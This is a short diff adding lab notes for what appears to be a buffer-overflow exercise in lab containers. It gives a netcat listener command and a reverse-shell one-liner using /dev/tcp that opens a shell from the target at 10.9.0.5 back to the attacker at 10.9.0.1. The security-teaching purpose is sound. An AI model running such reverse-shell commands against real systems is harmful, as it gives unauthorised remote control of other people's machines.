@@ -1,0 +1,4 @@
+All of the programs work after starting the container in Labsetup
+You should first have "nc -nv -l 9090" ready on the attacker machine. That is just the normal shell of the computer. 
+
+Now you run "/bin/bash -i > /dev/tcp/Attacker'sIP(10.9.0.1)/9090 0<&1 2>&1" on the exploit command. This command will use buffer overflow to run on the remote machine (10.9.0.5). Now you will have the shell on the netcat server you created earlier.
